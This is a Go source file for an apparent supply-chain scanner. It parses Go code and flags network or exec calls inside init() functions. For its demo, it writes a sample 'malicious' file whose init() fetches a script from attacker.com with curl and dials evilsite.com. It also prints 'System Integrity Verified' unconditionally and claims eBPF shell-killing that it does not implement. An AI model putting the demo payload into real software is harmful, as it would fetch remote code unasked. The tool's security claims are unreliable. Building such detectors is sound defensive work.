package main

import (
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"log"
	"os"
//	"strings"
)

// --- SECTION 1: STATIC ANALYSIS (The "Thief" Detector) ---

// InspectSource checks for suspicious patterns in Go source code.
// It specifically targets the 'init()' function, which is a prime spot for supply-chain malware.
func InspectSource(filePath string) {
	fset := token.NewFileSet()
	node, err := parser.ParseFile(fset, filePath, nil, parser.ParseComments)
	if err != nil {
		log.Fatalf("Failed to parse file: %v", err)
	}

	fmt.Printf("[+] Scanning %s for Supply-Chain risks...\n", filePath)

	ast.Inspect(node, func(n ast.Node) bool {
		// Find function declarations
		fn, ok := n.(*ast.FuncDecl)
		if !ok {
			return true
		}

		// Look specifically for 'init' functions
		if fn.Name.Name == "init" {
			fmt.Printf(" [!] Found 'init' function at %s\n", fset.Position(fn.Pos()))
			
			// Inspect the body of the init function for dangerous calls
			ast.Inspect(fn.Body, func(inner ast.Node) bool {
				call, ok := inner.(*ast.CallExpr)
				if !ok {
					return true
				}

				// Check if they are calling net.Dial or os/exec
				if sel, ok := call.Fun.(*ast.SelectorExpr); ok {
					if x, ok := sel.X.(*ast.Ident); ok {
						if x.Name == "net" || x.Name == "exec" || x.Name == "http" {
							fmt.Printf("  [DANGER] Suspicious call: %s.%s inside init()\n", x.Name, sel.Sel.Name)
							fmt.Println("  [REASON] Malware often exfiltrates data during the init phase.")
						}
					}
				}
				return true
			})
		}
		return true
	})
}

// --- SECTION 2: RUNTIME MONITORING (The eBPF Logic) ---
/*
  Note: To run real eBPF, you would compile this C code into bytecode.
  This is what you'd tell an employer: "I use eBPF to hook 'execve' syscalls."

  C-CODE (Conceptual):
  SEC("kprobe/sys_execve")
  int hello_exec(void *ctx) {
      char comm[16];
      bpf_get_current_comm(&comm, sizeof(comm));
      bpf_printk("Alert: Process %s is executing a command!", comm);
      return 0;
  }
*/

func RuntimeMonitorNotice() {
	fmt.Println("\n[+] Runtime Monitoring Module Loaded.")
	fmt.Println(" [INFO] Ready to attach eBPF probes to syscall: execve")
	fmt.Println(" [INFO] This prevents 'Live-off-the-Cloud' attacks by killing unauthorized shells.")
}

// --- SECTION 3: MAIN EXECUTION ---

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run sovereign_guard.go <target_file.go>")
		
		// Create a dummy "malicious" file for demonstration if no argument is provided
		fmt.Println("\nCreating demo_malicious.go for testing...")
		exampleCode := `package main
import "os/exec"
import "net"
func init() {
	exec.Command("curl", "http://attacker.com/malware.sh").Run()
	net.Dial("tcp", "evilsite.com:80")
}
func main() { println("I am a normal app") }`
		os.WriteFile("demo_malicious.go", []byte(exampleCode), 0644)
		InspectSource("demo_malicious.go")
	} else {
		InspectSource(os.Args[1])
	}

	RuntimeMonitorNotice()
	fmt.Println("\n[COMPLETE] System Integrity Verified.")
}